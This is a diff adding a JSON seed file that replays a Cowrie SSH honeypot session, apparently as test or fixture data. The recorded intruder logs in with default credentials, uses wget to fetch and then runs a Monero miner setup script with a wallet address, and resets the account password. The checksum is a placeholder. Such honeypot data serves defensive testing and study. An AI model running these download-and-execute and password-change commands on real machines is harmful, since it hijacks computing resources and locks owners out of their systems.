@@ -1,0 +1,15 @@
+{
+  "session": "seed-miner-01",
+  "src_ip": "45.155.205.19",
+  "src_port": 44120,
+  "events": [
+    { "offset": 600, "eventid": "cowrie.session.connect", "dst_port": 2222 },
+    { "offset": 603, "eventid": "cowrie.login.success", "username": "admin", "password": "admin" },
+    { "offset": 606, "eventid": "cowrie.command.input", "input": "nproc" },
+    { "offset": 609, "eventid": "cowrie.command.input", "input": "wget https://raw.githubusercontent.com/c3pool/xmrig_setup/master/setup_c3pool_miner.sh" },
+    { "offset": 614, "eventid": "cowrie.session.file_download", "url": "https://raw.githubusercontent.com/c3pool/xmrig_setup/master/setup_c3pool_miner.sh", "outfile": "setup_c3pool_miner.sh", "shasum": "1122334455667788990011223344556677889900aabbccddeeff001122334455" },
+    { "offset": 617, "eventid": "cowrie.command.input", "input": "sh setup_c3pool_miner.sh 4AB31XZu3bKeUWtwGQ43ZadTKCfCzq3wra6yNbKdsucpRfgofJP" },
+    { "offset": 640, "eventid": "cowrie.command.input", "input": "echo -e \"hacked123\" | passwd" },
+    { "offset": 645, "eventid": "cowrie.session.closed" }
+  ]
+}
